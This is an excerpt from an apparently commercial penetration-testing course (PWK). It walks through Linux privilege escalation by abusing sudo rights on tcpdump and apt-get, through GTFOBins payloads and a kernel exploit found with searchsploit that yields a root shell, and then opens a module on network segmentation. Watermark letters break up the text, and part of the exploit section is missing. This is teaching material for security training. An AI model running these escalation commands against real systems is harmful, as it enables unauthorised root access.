User joe may run the following commands on debian-privesc:
(ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
Listing 503 - Inspecting current user’s sudo permissions
From the output in listing 503, we notice that only crontab jobs, tcpdump, and apt-get utilities are
listed as allowing sudo commands.
If the /etc/sudoers configurations are too permissive, a user could abuse the short-lived
administrative right to obtain permanent root access.
Since the first of the three permitted commands does not allow us to edit any crontab, it’s unlikely
that we could use this to find any escalation route. The second command looks more promising,
so let’s browse GTFObins868 for suggestions on how to abuse it.
Running the hinted commands, however, reveals an unexpected outcome:
joe@debian-privesc:~$ COMMAND='id'
joe@debian-privesc:~$ TF=$(mktemp)
866 (Linux man-pages project, 2022), https://man7.org/linux/man-pages/man8/sudo.8.html
867 (Linux man-pages project, 2022), https://man7.org/linux/man-pages/man5/sudoers.5.html
868 (E.Pinna, A.Cardaci, 2022), https://gtfobins.github.io/gtfobins/tcpdump/#sudo
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 557
Made in Morocco
Penetration Testing with Kali Linux
joe@debian-privesc:~$ echo "$COMMAND" > $TF
joe@debian-privesc:~$ chmod +x $TF
joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
[sudo] password for joe:
dropped privs to root
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...
compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied
Listing 504 - Attempting to abuse tcpdump sudo permissions
Surprisingly, once we’ve executed the suggested command-set, we are prompted with a
“permission denied” error message.
To further investigate the culprit, we can inspect the syslog file for any occurrence of the tcpdump
keyword.
y
joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
...
k
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400
audit(1661759534.607:27): apparmor="DENIED" operation="exec"
profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump"
s
requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
Listing 505 - Inspecting the syslog file for ‘tcpdump’ related events
o
The output in Listing 505 shows that the audit869 daemon has logged our privilege escalation
attempt. Closer inspection reveals that AppArmor870 was triggered and blocked us.
n
AppArmor is a kernel module that provides mandatory access control (MAC) on Linux systems by
running various application-specific profiles, and it’s enabled by default on Debian 10. We can
i
verify AppArmor’s status as the root user using the aa-status command.
z
joe@debian-privesc:~$ su - root
Password: D
root@debian-privesc:~# aa-status
apparmor module is loaded.
20 profiles are loaded.
18 profiles are in enforce mode.
/usr/bin/evince
/usr/bin/evince-previewer
/usr/bin/evince-previewer//sanitized_helper
/usr/bin/evince-thumbnailer
/usr/bin/evince//sanitized_helper
/usr/bin/man
/usr/lib/cups/backend/cups-pdf
/usr/sbin/cups-browsed
/usr/sbin/cupsd
/usr/sbin/cupsd//third_party
/usr/sbin/tcpdump
...
2 profiles are in complain mode.
libreoffice-oopslash
libreoffice-soffice
869 (Linux man-pages project, 2022), https://man7.org/linux/man-pages/man8/auditd.8.html
870 (AppArmor, 2022), https://apparmor.net
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 558
Made in Morocco
Penetration Testing with Kali Linux
3 processes have profiles defined.
3 processes are in enforce mode.
/usr/sbin/cups-browsed (502)
/usr/sbin/cupsd (654)
/usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
Listing 506 - Verifying AppArmon status
Listing 506 confirms that tcpdump is actively protected with a dedicated AppArmor profile.
Since the first two commands from the sudoers file did not work, let’s examine the third allowed
sudo command: apt-get. Returning again to GTFOBins,871 we’ll select the first option (a). The
payload first runs the changelog apt-get command option, invoking the less application from
which we can execute a bash shell.
y
sudo apt-get changelog apt
!/bin/sh
k
Listing 507 - ‘Apt-get’ privilege escalation payload
We can try the above commands as the joe user by copying them in our active shell.
s
joe@debian-privesc:~$ sudo apt-get changelog apt
... o
Fetched 459 kB in 0s (39.7 MB/s)
# id
uid=0(root) gid=0(root) groups=0(root) n
Listing 508 - Obtaining a root shell by abusing sudo permissions
Excellent! We managed to obtain ia privileged root shell by abusing a misconfigured sudo
configuration. z
In the final section, we’ll learn how to enumerate Linux kernel exploits and investigate how to
D
elevate privileges through them.
17.4.3 Exploiting Kernel Vulnerabilities
Kernel exploits are an excellent way to escalate privileges, but our success may depend on
matching not only the target’s kernel version, but also the operating system flavor, such as
Debian, RHEL, Gentoo, etc.
To demonstrate this attack vector, we will first gather information about our Ubuntu target by
inspecting the /etc/issue file. As discussed earlier in the Module, this is a system text file that
contains a message or system identification to be printed before the login prompt on Linux
machines.
joe@ubuntu-privesc:~$ cat /etc/issue
Ubuntu 16.04.4 LTS \n \l
Listing 509 - Gathering general information on the target system
Next, we will inspect the kernel version and system architecture using standard system
commands:
871 (E.Pinna, A.Cardaci, 2022), https://gtfobins.github.io/gtfobins/apt-get/#sudo
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 559
Made in Morocco
Penetration Testing with Kali Linux
joe@ubuntu-privesc:~$ uname -r
4.4.0-116-generic
joe@ubuntu-privesc:~$ arch
x86_64
Listing 510 - Gathering kernel and architecture information from our Linux target
Our target system appears to be running Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) on the
x86_64 architecture. Armed with this information, we can use searchsploit872 on our local Kali
system to find kernel exploits matching the target version. We want to use “linux kernel Ubuntu 16
Local Privilege Escalation” as our main keywords. We also want to filter out some clutter from the
output, so we’ll exclude anything below kernel version 4.4.0 and anything that matches kernel
version 4.8.
kali@kali:~$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep
y
"4." | grep -v "  ffff88007bd1f100 o
[*] Leaking sock struct from ffff880079bd9c00
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880075c11e40 n
[*] UID from cred structure: 1001, matches the current: 1001
[*] hammering cred structure at ffff880075c11e40
[*] credentials patched, launchiing shell...
# id z
uid=0(root) gid=0(root) groups=0(root),1001(joe)
#
D
Listing 517 - Obtaining a root shell via kernel exploitation
Great! We managed to obtain a root shell by exploiting a known kernel vulnerability.
In this section, we learned how to manually enumerate our target for any known kernel
vulnerabilities. We then discovered how to feed searchsploit our information in order to select the
right exploit source code. Finally, we compiled the exploit and ran it against the target machine to
gain an administrative shell.
17.5 Wrapping Up
In this Module, we covered many concepts surrounding Linux privilege escalation. We explored
both manual and automated enumeration techniques that reveal required information for these
types of attacks. We also examined how to gain administrative access via unprotected
credentials, insecure file permissions, and binary flags. We concluded by learning how to
enumerate for kernel vulnerabilities and find matching exploits.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 562
Made in Morocco
Penetration Testing with Kali Linux
18 Port Redirection and SSH Tunneling
In this Learning Module, we will cover the following Learning Units:
• Port Forwarding on *NIX and Windows Machines
• SSH Tunneling on (and between) *NIX and Windows Machines
18.1 Why Port Redirection and Tunneling?
This Learning Unit covers the following Learning Objectives:
1. Understand the difference between common network layouts
y
2. Consider the impact of common network security devices
3. Understand when to use port redirection and tunneling techniques
k
Most network environments are not (and should not be) flat.874 In a flat network, all devices are
able to communicate freely with each other. There is littsle (or no) attempt to limit the access that
each device has to other devices on the same network, regardless of whether devices need to
communicate during normal operations.
o
Flat network topology is generally considered poor security practice. Once an attacker has access
to a single host, they can start communicanting with every other host. From there, it will be much
easier to spread through the network and start compromising other hosts.
A more securely-designed network tiype is segmented.875 This type of network will be broken into
smaller networks, each of which izs called a subnet.876 Each subnet will contain a group of devices
that have a specific purpose, and devices on that subnet are only granted access to other subnets
and hosts when absolutely necessary. Network segmentation severely limits attackers, because
D
compromising a single host no longer gives them free access to every other device on the
network.